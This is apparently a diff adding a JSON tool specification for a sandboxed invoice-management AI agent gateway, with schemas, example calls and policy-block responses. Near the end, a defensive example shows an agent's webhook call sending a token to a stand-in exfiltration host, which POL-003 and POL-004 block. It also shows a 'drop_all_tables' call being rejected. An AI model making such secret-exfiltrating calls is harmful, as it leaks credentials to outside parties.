@@ -1,0 +1,1214 @@
+{
+  "version": "1.2.0",
+  "contracts_version": "1.2.0",
+  "execution_endpoint": "/api/tools/execute",
+  "request_schema_ref": "api.schema.json#/$defs/ExecuteRequest",
+  "success_response_schema_ref": "api.schema.json#/$defs/ExecuteSuccessResponse",
+  "conventions": [
+    "All identifiers in examples are UUID v4 except invoice IDs (INV-0001..INV-0500), which are business keys.",
+    "HTTP 200 always means status SUCCESS. Blocked or failed calls return an error.schema.json envelope.",
+    "mutations_recorded is the number of invoice rows the call changed in the speculative database; stage_webhook always records 0.",
+    "tool_decision is tool-level; session_gate_decision is the current session-level gate_decision. ALLOW never means approved for commit.",
+    "Tools with read_only=false are rejected with 403 POLICY_BLOCK (details.reason SESSION_BLOCKED) once the session gate is BLOCK.",
+    "Tool arguments are stored redacted (policies.json redaction). Invoice row values are never redacted.",
+    "Agents receive no filesystem paths, connection strings or SQL access; tools operate only on the session's speculative database."
+  ],
+  "unknown_tool_handling": {
+    "policy_id": "POL-005",
+    "tool_decision": "BLOCK",
+    "http_status": 400,
+    "error_code": "INVALID_TOOL",
+    "effect_scope": "TOOL",
+    "session_gate_effect": "none (the session is not blocked solely because of an unknown tool name)",
+    "example_error_response": {
+      "error": {
+        "code": "INVALID_TOOL",
+        "message": "Tool 'drop_all_tables' is not in the tools.json allowlist; the call was blocked and not executed.",
+        "http_status": 400,
+        "details": {
+          "operation_id": "fb59fe1c-045c-4898-b989-90b5874ea4ba",
+          "tool_name": "drop_all_tables",
+          "tool_decision": "BLOCK",
+          "session_gate_decision": "PENDING",
+          "policy_violations": [
+            {
+              "policy_id": "POL-005",
+              "policy_name": "Unknown Tool Rejection",
+              "severity": "CRITICAL",
+              "decision": "BLOCK",
+              "effect_scope": "TOOL",
+              "stage": "TOOL_EXECUTE",
+              "operation_id": "fb59fe1c-045c-4898-b989-90b5874ea4ba",
+              "explanation": "Tool 'drop_all_tables' is not in the tools.json allowlist.",
+              "affected_record_count": null,
+              "timestamp": "2026-11-24T12:20:00Z"
+            }
+          ]
+        },
+        "request_id": "9fd1e93c-b2fc-49b4-ba51-1c4abf05a495",
+        "timestamp": "2026-11-24T12:20:00Z"
+      }
+    },
+    "details_schema": "api.schema.json#/$defs/InvalidToolDetails"
+  },
+  "session_block_rejection_example": {
+    "description": "Mutating tool call after the session gate became BLOCK.",
+    "example_error_response": {
+      "error": {
+        "code": "POLICY_BLOCK",
+        "message": "Session gate_decision is BLOCK; mutating tools are rejected. Read-only inspection, /complete and /rollback remain available.",
+        "http_status": 403,
+        "details": {
+          "reason": "SESSION_BLOCKED",
+          "operation_id": "0aa92fcb-4ed3-413f-8cd6-34bcad317f5d",
+          "tool_name": "update_invoice",
+          "tool_decision": "BLOCK",
+          "session_gate_decision": "BLOCK",
+          "blocking_policy_ids": [
+            "POL-003",
+            "POL-004"
+          ]
+        },
+        "request_id": "8000e101-c742-4d96-87f1-a62481482514",
+        "timestamp": "2026-11-24T12:01:50Z"
+      }
+    },
+    "details_schema": "api.schema.json#/$defs/SessionBlockedDetails"
+  },
+  "tools": [
+    {
+      "name": "list_invoices",
+      "description": "List invoices from the session's speculative SQLite database with optional status and customer-name filters (AND-ed) and pagination. Ordered by id ascending.",
+      "read_only": true,
+      "parameters": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [],
+        "properties": {
+          "status": {
+            "type": "string",
+            "enum": [
+              "OVERDUE",
+              "PAID",
+              "PENDING",
+              "CANCELLED"
+            ],
+            "description": "Optional invoice status filter."
+          },
+          "customer_name": {
+            "type": "string",
+            "minLength": 1,
+            "maxLength": 200,
+            "description": "Case-insensitive substring filter on customer_name."
+          },
+          "limit": {
+            "type": "integer",
+            "minimum": 1,
+            "maximum": 500,
+            "default": 50,
+            "description": "Maximum number of invoices to return."
+          },
+          "offset": {
+            "type": "integer",
+            "minimum": 0,
+            "default": 0,
+            "description": "Pagination offset."
+          }
+        }
+      },
+      "result_schema": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "total_matching",
+          "returned",
+          "invoices"
+        ],
+        "properties": {
+          "total_matching": {
+            "type": "integer",
+            "minimum": 0
+          },
+          "returned": {
+            "type": "integer",
+            "minimum": 0
+          },
+          "invoices": {
+            "type": "array",
+            "items": {
+              "$ref": "invoice.schema.json"
+            }
+          }
+        }
+      },
+      "errors": [
+        "INVALID_ARGUMENTS"
+      ],
+      "example_invocation": {
+        "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+        "tool_name": "list_invoices",
+        "arguments": {
+          "status": "OVERDUE",
+          "limit": 2,
+          "offset": 0
+        }
+      },
+      "example_success_response": {
+        "operation_id": "02c32547-5512-4174-af87-f1fc4bcca4db",
+        "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+        "tool_name": "list_invoices",
+        "status": "SUCCESS",
+        "read_only": true,
+        "tool_decision": "ALLOW",
+        "session_gate_decision": "PENDING",
+        "mutations_recorded": 0,
+        "policy_violations": [],
+        "result": {
+          "total_matching": 420,
+          "returned": 2,
+          "invoices": [
+            {
+              "id": "INV-0001",
+              "customer_name": "Northwind Logistics",
+              "customer_email": "ap@northwind.example.com",
+              "amount_cents": 145000,
+              "currency": "USD",
+              "status": "OVERDUE",
+              "due_date": "2026-10-15",
+              "notes": "Net 30",
+              "version": 1,
+              "created_at": "2026-09-15T10:00:00Z",
+              "updated_at": "2026-09-15T10:00:00Z"
+            },
+            {
+              "id": "INV-0002",
+              "customer_name": "Fabrikam Supplies",
+              "customer_email": "accounts@fabrikam.example.com",
+              "amount_cents": 32050,
+              "currency": "USD",
+              "status": "OVERDUE",
+              "due_date": "2026-10-18",
+              "notes": null,
+              "version": 1,
+              "created_at": "2026-09-18T09:30:00Z",
+              "updated_at": "2026-09-18T09:30:00Z"
+            }
+          ]
+        },
+        "executed_at": "2026-11-24T12:10:05Z"
+      }
+    },
+    {
+      "name": "get_invoice",
+      "description": "Retrieve a single invoice by ID from the session's speculative SQLite database. Missing invoice: 404 INVOICE_NOT_FOUND.",
+      "read_only": true,
+      "parameters": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "invoice_id"
+        ],
+        "properties": {
+          "invoice_id": {
+            "type": "string",
+            "pattern": "^INV-\\d{4}$",
+            "description": "Exact invoice ID (e.g., INV-0042)."
+          }
+        }
+      },
+      "result_schema": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "invoice"
+        ],
+        "properties": {
+          "invoice": {
+            "$ref": "invoice.schema.json"
+          }
+        }
+      },
+      "errors": [
+        "INVALID_ARGUMENTS",
+        "INVOICE_NOT_FOUND"
+      ],
+      "example_invocation": {
+        "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+        "tool_name": "get_invoice",
+        "arguments": {
+          "invoice_id": "INV-0042"
+        }
+      },
+      "example_success_response": {
+        "operation_id": "2d8a6f0c-7b3e-4c15-9e48-b1a7d3f5c902",
+        "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+        "tool_name": "get_invoice",
+        "status": "SUCCESS",
+        "read_only": true,
+        "tool_decision": "ALLOW",
+        "session_gate_decision": "PENDING",
+        "mutations_recorded": 0,
+        "policy_violations": [],
+        "result": {
+          "invoice": {
+            "id": "INV-0042",
+            "customer_name": "Contoso Retail",
+            "customer_email": "billing@contoso.example.com",
+            "amount_cents": 89000,
+            "currency": "USD",
+            "status": "OVERDUE",
+            "due_date": "2026-10-20",
+            "notes": null,
+            "version": 1,
+            "created_at": "2026-09-20T08:00:00Z",
+            "updated_at": "2026-09-20T08:00:00Z"
+          }
+        },
+        "executed_at": "2026-11-24T12:10:10Z"
+      }
+    },
+    {
+      "name": "update_invoice",
+      "description": "Update one or more agent-mutable fields (status, amount_cents, due_date, notes) of an existing invoice in the speculative database. At least one must be provided. Increments version and sets updated_at. A call whose values all equal the current values succeeds with mutations_recorded 0. A notes value containing a secret marker is rejected (422 INVALID_ARGUMENTS, reason SECRET_IN_ARGUMENT) because mutation records are replayed verbatim at commit and must never be redacted.",
+      "read_only": false,
+      "parameters": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "invoice_id"
+        ],
+        "anyOf": [
+          {
+            "required": [
+              "status"
+            ]
+          },
+          {
+            "required": [
+              "amount_cents"
+            ]
+          },
+          {
+            "required": [
+              "due_date"
+            ]
+          },
+          {
+            "required": [
+              "notes"
+            ]
+          }
+        ],
+        "properties": {
+          "invoice_id": {
+            "type": "string",
+            "pattern": "^INV-\\d{4}$",
+            "description": "Target invoice ID."
+          },
+          "status": {
+            "type": "string",
+            "enum": [
+              "OVERDUE",
+              "PAID",
+              "PENDING",
+              "CANCELLED"
+            ],
+            "description": "New invoice status."
+          },
+          "amount_cents": {
+            "type": "integer",
+            "minimum": 1,
+            "description": "Updated invoice amount in cents."
+          },
+          "due_date": {
+            "type": "string",
+            "format": "date",
+            "description": "Updated due date (YYYY-MM-DD)."
+          },
+          "notes": {
+            "type": [
+              "string",
+              "null"
+            ],
+            "maxLength": 500,
+            "description": "Updated billing notes."
+          }
+        }
+      },
+      "result_schema": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "updated_invoice"
+        ],
+        "properties": {
+          "updated_invoice": {
+            "$ref": "invoice.schema.json"
+          }
+        }
+      },
+      "errors": [
+        "INVALID_ARGUMENTS",
+        "INVOICE_NOT_FOUND",
+        "POLICY_BLOCK"
+      ],
+      "example_invocation": {
+        "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+        "tool_name": "update_invoice",
+        "arguments": {
+          "invoice_id": "INV-0042",
+          "status": "PAID",
+          "notes": "Wire transfer confirmed"
+        }
+      },
+      "example_success_response": {
+        "operation_id": "6e0a4c8f-1d7b-4e92-b3a5-f2c9d1e7b406",
+        "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+        "tool_name": "update_invoice",
+        "status": "SUCCESS",
+        "read_only": false,
+        "tool_decision": "ALLOW",
+        "session_gate_decision": "PENDING",
+        "mutations_recorded": 1,
+        "policy_violations": [],
+        "result": {
+          "updated_invoice": {
+            "id": "INV-0042",
+            "customer_name": "Contoso Retail",
+            "customer_email": "billing@contoso.example.com",
+            "amount_cents": 89000,
+            "currency": "USD",
+            "status": "PAID",
+            "due_date": "2026-10-20",
+            "notes": "Wire transfer confirmed",
+            "version": 2,
+            "created_at": "2026-09-20T08:00:00Z",
+            "updated_at": "2026-11-24T12:10:20Z"
+          }
+        },
+        "executed_at": "2026-11-24T12:10:20Z"
+      }
+    },
+    {
+      "name": "delete_invoice",
+      "description": "Delete a single invoice from the session's speculative database. Missing invoice: 404 INVOICE_NOT_FOUND.",
+      "read_only": false,
+      "parameters": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "invoice_id"
+        ],
+        "properties": {
+          "invoice_id": {
+            "type": "string",
+            "pattern": "^INV-\\d{4}$",
+            "description": "Target invoice ID to delete."
+          },
+          "reason": {
+            "type": "string",
+            "minLength": 1,
+            "maxLength": 500,
+            "description": "Optional audit reason (stored redacted)."
+          }
+        }
+      },
+      "result_schema": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "deleted_invoice_id"
+        ],
+        "properties": {
+          "deleted_invoice_id": {
+            "type": "string",
+            "pattern": "^INV-\\d{4}$"
+          }
+        }
+      },
+      "errors": [
+        "INVALID_ARGUMENTS",
+        "INVOICE_NOT_FOUND",
+        "POLICY_BLOCK"
+      ],
+      "example_invocation": {
+        "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+        "tool_name": "delete_invoice",
+        "arguments": {
+          "invoice_id": "INV-0499",
+          "reason": "Duplicate test invoice"
+        }
+      },
+      "example_success_response": {
+        "operation_id": "219314fa-29d4-462a-b4a7-969160471677",
+        "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+        "tool_name": "delete_invoice",
+        "status": "SUCCESS",
+        "read_only": false,
+        "tool_decision": "ALLOW",
+        "session_gate_decision": "PENDING",
+        "mutations_recorded": 1,
+        "policy_violations": [],
+        "result": {
+          "deleted_invoice_id": "INV-0499"
+        },
+        "executed_at": "2026-11-24T12:09:20Z"
+      }
+    },
+    {
+      "name": "bulk_delete_invoices",
+      "description": "Delete multiple invoices in the speculative database. At least one of invoice_ids or status is required. AND semantics: when both are supplied only invoices whose id is in invoice_ids AND whose status equals status are deleted. Every ID in invoice_ids MUST exist in the speculative database; if any requested ID does not exist the ENTIRE call fails with 404 INVOICE_NOT_FOUND and nothing is deleted. Existing IDs that do not match the status filter are skipped and listed in unmatched_invoice_ids. A status-only call matching zero rows succeeds with 0 mutations. The whole call runs in one speculative-DB transaction.",
+      "read_only": false,
+      "parameters": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [],
+        "anyOf": [
+          {
+            "required": [
+              "invoice_ids"
+            ]
+          },
+          {
+            "required": [
+              "status"
+            ]
+          }
+        ],
+        "properties": {
+          "invoice_ids": {
+            "type": "array",
+            "minItems": 1,
+            "maxItems": 500,
+            "uniqueItems": true,
+            "items": {
+              "type": "string",
+              "pattern": "^INV-\\d{4}$"
+            },
+            "description": "Explicit invoice IDs. All must exist."
+          },
+          "status": {
+            "type": "string",
+            "enum": [
+              "OVERDUE",
+              "PAID",
+              "PENDING",
+              "CANCELLED"
+            ],
+            "description": "Status filter (AND-ed with invoice_ids when both are supplied)."
+          },
+          "reason": {
+            "type": "string",
+            "minLength": 1,
+            "maxLength": 500,
+            "description": "Optional audit reason (stored redacted)."
+          }
+        }
+      },
+      "result_schema": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "deleted_count",
+          "deleted_invoice_ids",
+          "unmatched_invoice_ids"
+        ],
+        "properties": {
+          "deleted_count": {
+            "type": "integer",
+            "minimum": 0
+          },
+          "deleted_invoice_ids": {
+            "type": "array",
+            "items": {
+              "type": "string",
+              "pattern": "^INV-\\d{4}$"
+            }
+          },
+          "unmatched_invoice_ids": {
+            "type": "array",
+            "items": {
+              "type": "string",
+              "pattern": "^INV-\\d{4}$"
+            },
+            "description": "Requested IDs that exist but do not match the status filter. Empty when status is not supplied."
+          }
+        }
+      },
+      "errors": [
+        "INVALID_ARGUMENTS",
+        "INVOICE_NOT_FOUND",
+        "POLICY_BLOCK"
+      ],
+      "example_invocation": {
+        "session_id": "3f2b8a1e-5c4d-4e7a-9b1f-0a6d2c8e4f10",
+        "tool_name": "bulk_delete_invoices",
+        "arguments": {
+          "status": "OVERDUE",
+          "reason": "Purge all overdue invoices"
+        }
+      },
+      "example_success_response": {
+        "operation_id": "9a1c5e7d-2b4f-4d86-a3c1-7e0f5b2d9c48",
+        "session_id": "3f2b8a1e-5c4d-4e7a-9b1f-0a6d2c8e4f10",
+        "tool_name": "bulk_delete_invoices",
+        "status": "SUCCESS",
+        "read_only": false,
+        "tool_decision": "ALLOW",
+        "session_gate_decision": "PENDING",
+        "mutations_recorded": 420,
+        "policy_violations": [],
+        "result": {
+          "deleted_count": 420,
+          "deleted_invoice_ids": [
+            "INV-0001",
+            "INV-0002",
+            "INV-0003",
+            "INV-0004",
+            "INV-0005",
+            "INV-0006",
+            "INV-0007",
+            "INV-0008",
+            "INV-0009",
+            "INV-0010",
+            "INV-0011",
+            "INV-0012",
+            "INV-0013",
+            "INV-0014",
+            "INV-0015",
+            "INV-0016",
+            "INV-0017",
+            "INV-0018",
+            "INV-0019",
+            "INV-0020",
+            "INV-0021",
+            "INV-0022",
+            "INV-0023",
+            "INV-0024",
+            "INV-0025",
+            "INV-0026",
+            "INV-0027",
+            "INV-0028",
+            "INV-0029",
+            "INV-0030",
+            "INV-0031",
+            "INV-0032",
+            "INV-0033",
+            "INV-0034",
+            "INV-0035",
+            "INV-0036",
+            "INV-0037",
+            "INV-0038",
+            "INV-0039",
+            "INV-0040",
+            "INV-0041",
+            "INV-0042",
+            "INV-0043",
+            "INV-0044",
+            "INV-0045",
+            "INV-0046",
+            "INV-0047",
+            "INV-0048",
+            "INV-0049",
+            "INV-0050",
+            "INV-0051",
+            "INV-0052",
+            "INV-0053",
+            "INV-0054",
+            "INV-0055",
+            "INV-0056",
+            "INV-0057",
+            "INV-0058",
+            "INV-0059",
+            "INV-0060",
+            "INV-0061",
+            "INV-0062",
+            "INV-0063",
+            "INV-0064",
+            "INV-0065",
+            "INV-0066",
+            "INV-0067",
+            "INV-0068",
+            "INV-0069",
+            "INV-0070",
+            "INV-0071",
+            "INV-0072",
+            "INV-0073",
+            "INV-0074",
+            "INV-0075",
+            "INV-0076",
+            "INV-0077",
+            "INV-0078",
+            "INV-0079",
+            "INV-0080",
+            "INV-0081",
+            "INV-0082",
+            "INV-0083",
+            "INV-0084",
+            "INV-0085",
+            "INV-0086",
+            "INV-0087",
+            "INV-0088",
+            "INV-0089",
+            "INV-0090",
+            "INV-0091",
+            "INV-0092",
+            "INV-0093",
+            "INV-0094",
+            "INV-0095",
+            "INV-0096",
+            "INV-0097",
+            "INV-0098",
+            "INV-0099",
+            "INV-0100",
+            "INV-0101",
+            "INV-0102",
+            "INV-0103",
+            "INV-0104",
+            "INV-0105",
+            "INV-0106",
+            "INV-0107",
+            "INV-0108",
+            "INV-0109",
+            "INV-0110",
+            "INV-0111",
+            "INV-0112",
+            "INV-0113",
+            "INV-0114",
+            "INV-0115",
+            "INV-0116",
+            "INV-0117",
+            "INV-0118",
+            "INV-0119",
+            "INV-0120",
+            "INV-0121",
+            "INV-0122",
+            "INV-0123",
+            "INV-0124",
+            "INV-0125",
+            "INV-0126",
+            "INV-0127",
+            "INV-0128",
+            "INV-0129",
+            "INV-0130",
+            "INV-0131",
+            "INV-0132",
+            "INV-0133",
+            "INV-0134",
+            "INV-0135",
+            "INV-0136",
+            "INV-0137",
+            "INV-0138",
+            "INV-0139",
+            "INV-0140",
+            "INV-0141",
+            "INV-0142",
+            "INV-0143",
+            "INV-0144",
+            "INV-0145",
+            "INV-0146",
+            "INV-0147",
+            "INV-0148",
+            "INV-0149",
+            "INV-0150",
+            "INV-0151",
+            "INV-0152",
+            "INV-0153",
+            "INV-0154",
+            "INV-0155",
+            "INV-0156",
+            "INV-0157",
+            "INV-0158",
+            "INV-0159",
+            "INV-0160",
+            "INV-0161",
+            "INV-0162",
+            "INV-0163",
+            "INV-0164",
+            "INV-0165",
+            "INV-0166",
+            "INV-0167",
+            "INV-0168",
+            "INV-0169",
+            "INV-0170",
+            "INV-0171",
+            "INV-0172",
+            "INV-0173",
+            "INV-0174",
+            "INV-0175",
+            "INV-0176",
+            "INV-0177",
+            "INV-0178",
+            "INV-0179",
+            "INV-0180",
+            "INV-0181",
+            "INV-0182",
+            "INV-0183",
+            "INV-0184",
+            "INV-0185",
+            "INV-0186",
+            "INV-0187",
+            "INV-0188",
+            "INV-0189",
+            "INV-0190",
+            "INV-0191",
+            "INV-0192",
+            "INV-0193",
+            "INV-0194",
+            "INV-0195",
+            "INV-0196",
+            "INV-0197",
+            "INV-0198",
+            "INV-0199",
+            "INV-0200",
+            "INV-0201",
+            "INV-0202",
+            "INV-0203",
+            "INV-0204",
+            "INV-0205",
+            "INV-0206",
+            "INV-0207",
+            "INV-0208",
+            "INV-0209",
+            "INV-0210",
+            "INV-0211",
+            "INV-0212",
+            "INV-0213",
+            "INV-0214",
+            "INV-0215",
+            "INV-0216",
+            "INV-0217",
+            "INV-0218",
+            "INV-0219",
+            "INV-0220",
+            "INV-0221",
+            "INV-0222",
+            "INV-0223",
+            "INV-0224",
+            "INV-0225",
+            "INV-0226",
+            "INV-0227",
+            "INV-0228",
+            "INV-0229",
+            "INV-0230",
+            "INV-0231",
+            "INV-0232",
+            "INV-0233",
+            "INV-0234",
+            "INV-0235",
+            "INV-0236",
+            "INV-0237",
+            "INV-0238",
+            "INV-0239",
+            "INV-0240",
+            "INV-0241",
+            "INV-0242",
+            "INV-0243",
+            "INV-0244",
+            "INV-0245",
+            "INV-0246",
+            "INV-0247",
+            "INV-0248",
+            "INV-0249",
+            "INV-0250",
+            "INV-0251",
+            "INV-0252",
+            "INV-0253",
+            "INV-0254",
+            "INV-0255",
+            "INV-0256",
+            "INV-0257",
+            "INV-0258",
+            "INV-0259",
+            "INV-0260",
+            "INV-0261",
+            "INV-0262",
+            "INV-0263",
+            "INV-0264",
+            "INV-0265",
+            "INV-0266",
+            "INV-0267",
+            "INV-0268",
+            "INV-0269",
+            "INV-0270",
+            "INV-0271",
+            "INV-0272",
+            "INV-0273",
+            "INV-0274",
+            "INV-0275",
+            "INV-0276",
+            "INV-0277",
+            "INV-0278",
+            "INV-0279",
+            "INV-0280",
+            "INV-0281",
+            "INV-0282",
+            "INV-0283",
+            "INV-0284",
+            "INV-0285",
+            "INV-0286",
+            "INV-0287",
+            "INV-0288",
+            "INV-0289",
+            "INV-0290",
+            "INV-0291",
+            "INV-0292",
+            "INV-0293",
+            "INV-0294",
+            "INV-0295",
+            "INV-0296",
+            "INV-0297",
+            "INV-0298",
+            "INV-0299",
+            "INV-0300",
+            "INV-0301",
+            "INV-0302",
+            "INV-0303",
+            "INV-0304",
+            "INV-0305",
+            "INV-0306",
+            "INV-0307",
+            "INV-0308",
+            "INV-0309",
+            "INV-0310",
+            "INV-0311",
+            "INV-0312",
+            "INV-0313",
+            "INV-0314",
+            "INV-0315",
+            "INV-0316",
+            "INV-0317",
+            "INV-0318",
+            "INV-0319",
+            "INV-0320",
+            "INV-0321",
+            "INV-0322",
+            "INV-0323",
+            "INV-0324",
+            "INV-0325",
+            "INV-0326",
+            "INV-0327",
+            "INV-0328",
+            "INV-0329",
+            "INV-0330",
+            "INV-0331",
+            "INV-0332",
+            "INV-0333",
+            "INV-0334",
+            "INV-0335",
+            "INV-0336",
+            "INV-0337",
+            "INV-0338",
+            "INV-0339",
+            "INV-0340",
+            "INV-0341",
+            "INV-0342",
+            "INV-0343",
+            "INV-0344",
+            "INV-0345",
+            "INV-0346",
+            "INV-0347",
+            "INV-0348",
+            "INV-0349",
+            "INV-0350",
+            "INV-0351",
+            "INV-0352",
+            "INV-0353",
+            "INV-0354",
+            "INV-0355",
+            "INV-0356",
+            "INV-0357",
+            "INV-0358",
+            "INV-0359",
+            "INV-0360",
+            "INV-0361",
+            "INV-0362",
+            "INV-0363",
+            "INV-0364",
+            "INV-0365",
+            "INV-0366",
+            "INV-0367",
+            "INV-0368",
+            "INV-0369",
+            "INV-0370",
+            "INV-0371",
+            "INV-0372",
+            "INV-0373",
+            "INV-0374",
+            "INV-0375",
+            "INV-0376",
+            "INV-0377",
+            "INV-0378",
+            "INV-0379",
+            "INV-0380",
+            "INV-0381",
+            "INV-0382",
+            "INV-0383",
+            "INV-0384",
+            "INV-0385",
+            "INV-0386",
+            "INV-0387",
+            "INV-0388",
+            "INV-0389",
+            "INV-0390",
+            "INV-0391",
+            "INV-0392",
+            "INV-0393",
+            "INV-0394",
+            "INV-0395",
+            "INV-0396",
+            "INV-0397",
+            "INV-0398",
+            "INV-0399",
+            "INV-0400",
+            "INV-0401",
+            "INV-0402",
+            "INV-0403",
+            "INV-0404",
+            "INV-0405",
+            "INV-0406",
+            "INV-0407",
+            "INV-0408",
+            "INV-0409",
+            "INV-0410",
+            "INV-0411",
+            "INV-0412",
+            "INV-0413",
+            "INV-0414",
+            "INV-0415",
+            "INV-0416",
+            "INV-0417",
+            "INV-0418",
+            "INV-0419",
+            "INV-0420"
+          ],
+          "unmatched_invoice_ids": []
+        },
+        "executed_at": "2026-11-24T12:01:30Z"
+      },
+      "additional_examples": [
+        {
+          "label": "AND semantics: ids AND status (INV-0450 exists but is PAID, so it is skipped)",
+          "example_invocation": {
+            "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+            "tool_name": "bulk_delete_invoices",
+            "arguments": {
+              "invoice_ids": [
+                "INV-0001",
+                "INV-0450"
+              ],
+              "status": "OVERDUE"
+            }
+          },
+          "example_success_response": {
+            "operation_id": "ebc6c875-42ac-4aa8-a1b5-95862900bb6e",
+            "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+            "tool_name": "bulk_delete_invoices",
+            "status": "SUCCESS",
+            "read_only": false,
+            "tool_decision": "ALLOW",
+            "session_gate_decision": "PENDING",
+            "mutations_recorded": 1,
+            "policy_violations": [],
+            "result": {
+              "deleted_count": 1,
+              "deleted_invoice_ids": [
+                "INV-0001"
+              ],
+              "unmatched_invoice_ids": [
+                "INV-0450"
+              ]
+            },
+            "executed_at": "2026-11-24T12:09:40Z"
+          }
+        }
+      ],
+      "example_error_responses": [
+        {
+          "label": "Explicitly requested ID does not exist: whole call fails, nothing deleted",
+          "example_invocation": {
+            "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+            "tool_name": "bulk_delete_invoices",
+            "arguments": {
+              "invoice_ids": [
+                "INV-0001",
+                "INV-9999"
+              ]
+            }
+          },
+          "http_status": 404,
+          "response": {
+            "error": {
+              "code": "INVOICE_NOT_FOUND",
+              "message": "One or more requested invoice IDs do not exist; no invoices were deleted.",
+              "http_status": 404,
+              "details": {
+                "operation_id": "f79b1a9c-ccd4-4993-9fc4-0b42861e5cdc",
+                "missing_count": 1,
+                "missing_invoice_ids": [
+                  "INV-9999"
+                ],
+                "truncated": false
+              },
+              "request_id": "afa99e94-48b7-4d9e-ae02-ac18fd29656b",
+              "timestamp": "2026-11-24T12:09:45Z"
+            }
+          },
+          "details_schema": "api.schema.json#/$defs/InvoiceNotFoundDetails"
+        }
+      ]
+    },
+    {
+      "name": "stage_webhook",
+      "description": "Stage an outbound webhook notification in the session manifest. Webhooks are staged only and are NEVER dispatched. Records zero invoice mutations (mutations_recorded is always 0). url, event_type and payload are scanned by POL-003 (secret markers) and POL-004 (destination allowlist) before staging; a violation returns 403 POLICY_BLOCK and sets the session gate to BLOCK.",
+      "read_only": false,
+      "parameters": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "url",
+          "event_type",
+          "payload"
+        ],
+        "properties": {
+          "url": {
+            "type": "string",
+            "format": "uri",
+            "pattern": "^https://",
+            "description": "HTTPS destination URL; hostname must exactly match allowed_webhook_domains."
+          },
+          "event_type": {
+            "type": "string",
+            "minLength": 1,
+            "maxLength": 100,
+            "description": "Event identifier (e.g., invoice.updated)."
+          },
+          "payload": {
+            "type": "object",
+            "additionalProperties": true,
+            "description": "JSON payload (serialized size at most 64 KiB)."
+          }
+        }
+      },
+      "result_schema": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "webhook_id",
+          "url",
+          "event_type",
+          "staged_status"
+        ],
+        "properties": {
+          "webhook_id": {
+            "type": "string",
+            "pattern": "^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$"
+          },
+          "url": {
+            "type": "string",
+            "format": "uri"
+          },
+          "event_type": {
+            "type": "string"
+          },
+          "staged_status": {
+            "const": "STAGED"
+          }
+        }
+      },
+      "errors": [
+        "INVALID_ARGUMENTS",
+        "POLICY_BLOCK"
+      ],
+      "example_invocation": {
+        "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+        "tool_name": "stage_webhook",
+        "arguments": {
+          "url": "https://hooks.airlock.internal/billing-events",
+          "event_type": "invoice.updated",
+          "payload": {
+            "invoice_id": "INV-0042",
+            "status": "PAID"
+          }
+        }
+      },
+      "example_success_response": {
+        "operation_id": "a2f6d0b4-9c3e-4851-87d1-e5b9c3a1f7d8",
+        "session_id": "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
+        "tool_name": "stage_webhook",
+        "status": "SUCCESS",
+        "read_only": false,
+        "tool_decision": "ALLOW",
+        "session_gate_decision": "PENDING",
+        "mutations_recorded": 0,
+        "policy_violations": [],
+        "result": {
+          "webhook_id": "4c7e1a9d-0f5b-4d23-b68e-a1d5f9c3e072",
+          "url": "https://hooks.airlock.internal/billing-events",
+          "event_type": "invoice.updated",
+          "staged_status": "STAGED"
+        },
+        "executed_at": "2026-11-24T12:10:35Z"
+      },
+      "example_error_responses": [
+        {
+          "label": "Malicious webhook (secret marker + non-allowlisted host): blocked, never staged or dispatched",
+          "example_invocation": {
+            "session_id": "3f2b8a1e-5c4d-4e7a-9b1f-0a6d2c8e4f10",
+            "tool_name": "stage_webhook",
+            "arguments": {
+              "url": "https://evil-exfil.example.net/collect",
+              "event_type": "dump",
+              "payload": {
+                "token": "sk_live_DEMO_REDACTED"
+              }
+            }
+          },
+          "http_status": 403,
+          "response": {
+            "error": {
+              "code": "POLICY_BLOCK",
+              "message": "Tool call blocked by deterministic policy; session gate_decision is now BLOCK. The webhook was not staged or dispatched.",
+              "http_status": 403,
+              "details": {
+                "operation_id": "c4e8f0a2-6d1b-4f37-b95a-1d3e7c9a5f62",
+                "tool_name": "stage_webhook",
+                "tool_decision": "BLOCK",
+                "session_gate_decision": "BLOCK",
+                "policy_violations": [
+                  {
+                    "policy_id": "POL-003",
+                    "policy_name": "Secret Exfiltration in Webhook Payload",
+                    "severity": "CRITICAL",
+                    "decision": "BLOCK",
+                    "effect_scope": "SESSION",
+                    "stage": "TOOL_EXECUTE",
+                    "operation_id": "c4e8f0a2-6d1b-4f37-b95a-1d3e7c9a5f62",
+                    "explanation": "Webhook payload contains a configured secret marker at payload.token; value redacted.",
+                    "affected_record_count": null,
+                    "timestamp": "2026-11-24T12:01:40Z"
+                  },
+                  {
+                    "policy_id": "POL-004",
+                    "policy_name": "Unauthorized Webhook Destination",
+                    "severity": "CRITICAL",
+                    "decision": "BLOCK",
+                    "effect_scope": "SESSION",
+                    "stage": "TOOL_EXECUTE",
